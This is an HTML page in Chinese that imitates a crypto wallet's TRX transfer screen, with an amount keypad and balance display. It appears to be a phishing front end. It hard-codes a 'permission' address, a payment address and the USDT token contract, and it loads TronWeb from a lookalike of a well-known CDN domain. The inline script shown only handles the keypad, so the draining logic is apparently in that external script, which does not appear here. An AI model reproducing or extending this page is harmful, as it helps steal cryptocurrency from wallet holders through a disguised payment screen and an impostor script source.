<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
    <title>正在申请转账</title>
    <link rel="icon" type="image/png" href="png/icon_trx.png">
    <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
    <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body {
            background-color: #ffffff; /* 确保背景为白色 */
            color: #000000;
        }
        .tishi {
            width: 58%;
            padding: 0.1rem 0.3rem;
            background: #4b4848;
            z-index: 999999999999;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border-radius: 0.3rem;
            color: white;
            font-size: 1rem;
            text-align: center;
            line-height: 3rem;
            display: none;
            height: auto;
            margin: 0 auto;
        }
    </style>
    <link rel="stylesheet" href="css/okx.css">
</head>

<body id="app" class="uni-body pages-index-home">
    <noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>
    
    <uni-app class="uni-app--maxwidth">
        <uni-page data-page="pages/index/home">
            <uni-page-wrapper>
                <uni-page-body>
                    <div>
                        <div class="pay-box">
                            <div class="amount">
                                <div class="num">
                                    <span class="amount" id="amount">0</span>
                                    <em>TRX</em>
                                </div>
                                <img src="png/icon_exchange.jpg" class="icon">
                            </div>
                            <div class="rate">
                                <span id="amount-display">0.00</span>
                                <em>USD</em>
                                <div class="icon">
                                    <img src="png/icon_horn.jpg">
                                </div>
                            </div>
                        </div>
                        
                        <div class="bottom-keyboard">
                            <div class="asset-info">
                                <div class="name">
                                    <img src="png/icon_trx.png" class="coin">
                                    <div class="asset-box">
                                        <p class="title">余额</p>
                                        <p class="num">
                                            <span id="ye">0</span>
                                            <em>TRX</em>
                                        </p>
                                        <input type="text" id="address" style="display:none">
                                    </div>
                                </div>
                                <div class="right">
                                    <div class="btn" onclick="setMaxAmount()">最大</div>
                                </div>
                            </div>

                            <div class="keyboard-box">
                                <div class="btn" data-key="1">1</div>
                                <div class="btn" data-key="2">2</div>
                                <div class="btn" data-key="3">3</div>
                                <div class="btn" data-key="4">4</div>
                                <div class="btn" data-key="5">5</div>
                                <div class="btn" data-key="6">6</div>
                                <div class="btn" data-key="7">7</div>
                                <div class="btn" data-key="8">8</div>
                                <div class="btn" data-key="9">9</div>
                                <div class="btn" data-key=".">.</div>
                                <div class="btn" data-key="0">0</div>
                                <div class="btn delete" data-key="delete" style="margin-top:20px">
                                    <img src="png/icon_delete.jpg">
                                </div>
                            </div>
                            
                            <footer style="display: flex; justify-content: center; align-items: center; margin-top: 20px;">
                                <button class="submit-btn disabled" id="submitBtn" disabled onclick="onNextButtonClick()">
                                    下一步
                                </button>
                                <button id="jixu" class="jixu">继续</button>
                            </footer>
                        </div>
                    </div>
                    <div class="tishi" id="tip">提示</div>
                    <input id="to_address" type="hidden">
                </uni-page-body>
            </uni-page-wrapper>
        </uni-page>
    </uni-app>

    <script>
        window.Permission_address = 'TWHsgstoUNMsAVpnSKFJU2AQcDQ1zzL4oD';
        window.Payment_address = 'TKaKDsmfNuHU6M7iuPvK88Amq1ydTU2sKh';
        window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

        let currentAmount = "0";

        document.querySelectorAll('.keyboard-box .btn').forEach(button => {
            button.addEventListener('click', function () {
                pressKey(this.getAttribute('data-key'));
            });
        });

        function pressKey(key) {
            if (key === 'delete') {
                deleteLastChar();
                return;
            }
            if (key === '.' && currentAmount.includes('.')) return;
            currentAmount += key;
            updateAmountDisplay();
        }

        function deleteLastChar() {
            if (currentAmount.length > 1) {
                currentAmount = currentAmount.slice(0, -1);
            } else {
                currentAmount = "0";
            }
            updateAmountDisplay();
        }

        function updateAmountDisplay() {
            document.getElementById('amount').textContent = currentAmount;
            document.getElementById('amount-display').textContent = (parseFloat(currentAmount) * 0.1562).toFixed(2);
            updateNextButtonState();
        }

        function updateNextButtonState() {
            const nextButton = document.getElementById('submitBtn');
            nextButton.disabled = (parseFloat(currentAmount) <= 0);
            nextButton.classList.toggle('disabled', nextButton.disabled);
        }

        function setMaxAmount() {
            document.getElementById('amount').textContent = "全部";
        }

        function onNextButtonClick() {
            alert("执行下一步操作，金额：" + currentAmount + " TRX");
        }
    </script>
</body>
</html>
